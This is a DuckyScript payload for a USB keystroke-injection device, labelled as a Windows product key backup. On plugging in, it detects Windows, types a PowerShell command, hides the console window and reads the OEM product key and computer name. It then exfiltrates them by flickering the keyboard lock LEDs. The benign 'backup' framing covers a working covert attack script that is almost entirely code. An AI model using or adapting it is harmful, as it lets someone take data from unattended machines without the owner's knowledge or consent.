REM EvilKey Windows Product Key Backup
REM Local-only backup through Stage 8B Keystroke Reflection.
REM Local-only backup through Keystroke Reflection; it does not alter host security settings.

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

EXTENSION WINDOWS_FILELESS_HID_EXFIL
    FUNCTION Windows_Fileless_HID_Exfil()
        DELAY 250
        SAVE_HOST_KEYBOARD_LOCK_STATE
        $_EXFIL_MODE_ENABLED = TRUE
        $_EXFIL_LEDS_ENABLED = TRUE
        DELAY 500
        STRING |Out-String|Set-Variable -Name "DD";
        STRING $BL=$DD.ToCharArray();$c="";foreach($b in $BL){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b -band $a){$c+='%{NUMLOCK}'}else{$c+='%{CAPSLOCK}'}}}$c+='%{SCROLLLOCK}';
        STRINGLN Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($c);exit
        WAIT_FOR_SCROLL_CHANGE
        $_EXFIL_MODE_ENABLED = FALSE
        RESTORE_HOST_KEYBOARD_LOCK_STATE
    END_FUNCTION
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    REM Product key inventory does not require UAC. Keep the console visible until
    REM the complete command has been typed, then hide it before collecting data.
    DELAY 1000
    GUI m
    DELAY 1000
    GUI r
    DELAY 1500
    STRING powershell -NoProfile
    DELAY 500
    ENTER
    DELAY 2000

    REM WPK1|computer|firmware-license-description|full-OEM-key
    REM N means that Windows uses a digital/Retail license without an exportable
    REM OA3 firmware key. E contains only the PowerShell HRESULT.
    STRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public static class PicoFidoWindow{[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';[PicoFidoWindow]::ShowWindow([PicoFidoWindow]::GetConsoleWindow(),0)|Out-Null;& {try{$svc=Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction Stop;$key=([string]$svc.OA3xOriginalProductKey).Trim();$desc=((([string]$svc.OA3xOriginalProductKeyDescription)-replace '[^ -~]','?')-replace '\|','/').Trim();if([string]::IsNullOrWhiteSpace($desc)){$desc='OEM_FIRMWARE_KEY'};if(-not [string]::IsNullOrWhiteSpace($key)){'WPK1|'+$env:COMPUTERNAME+'|'+$desc+'|'+$key}else{'N|'+$env:COMPUTERNAME+'|DIGITAL_LICENSE_NO_EXPORTABLE_KEY'}}catch{'E|'+$env:COMPUTERNAME+'|'+('0x{0:X8}' -f $_.Exception.HResult)}}
    Windows_Fileless_HID_Exfil()

    DELAY 250
    LED_G
ELSE
    LED_R
    DELAY 1000
    LED_OFF
END_IF
